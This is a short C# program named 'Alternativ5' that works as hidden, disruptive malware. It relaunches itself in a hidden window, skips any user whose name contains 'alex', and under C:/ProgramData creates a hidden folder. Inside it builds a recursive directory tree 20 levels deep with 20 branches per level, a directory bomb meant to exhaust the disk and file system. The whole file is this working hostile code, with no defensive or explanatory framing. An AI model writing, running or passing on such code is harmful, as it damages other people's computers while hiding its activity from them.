using System;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Alternativ5
{
    class Program
    {
        static void Main(string[] args)
        {
            if (Environment.UserName.ToLower().Contains("alex"))
                return;

            else if (args.Length == 0)
            {
                var p = new Process();

                p.StartInfo.FileName = ".\\Alternativ5.exe";
                p.StartInfo.Arguments = "javad";
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.Start();
                return;
            }

            int i = 1;

            while (Directory.Exists($"C:/ProgramData/Stuff{i}"))
            {
                i++;
            }

            DirectoryInfo di = Directory.CreateDirectory($"C:/ProgramData/Stuff{i}");
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

            MakeDir($"C:/ProgramData/Stuff{i}", 0, 20);
        }

        static void MakeDir(string path, int depth, int maxdepth)
        {
            if (depth == maxdepth)
                return;

            for (int i = 1; i <= maxdepth; i++)
            {
                Directory.CreateDirectory($"{path}/Stuff{i}");
                MakeDir($"{path}/Stuff{i}", depth + 1, maxdepth);
            }
        }
    }
}
